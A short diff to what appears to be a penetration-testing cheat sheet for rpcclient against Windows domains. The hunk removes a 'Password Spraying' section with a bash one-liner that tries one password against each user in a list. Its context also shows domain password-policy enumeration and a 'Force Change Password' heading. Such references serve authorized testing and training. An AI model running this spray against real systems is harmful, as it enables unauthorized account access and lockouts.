@@ -57,14 +57,6 @@ getusrdompwinfo <RID>           # password settings for a specific user RID
 querydominfo                    # also includes basic policy summary
 ```
 
-## Password Spraying
-
-Manual spray when `netexec` is unavailable:
-
-```bash
-for u in $(cat <USERS>); do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <TARGET> | grep Authority; done
-```
-
 ## Modify
 
 ### Force Change Password
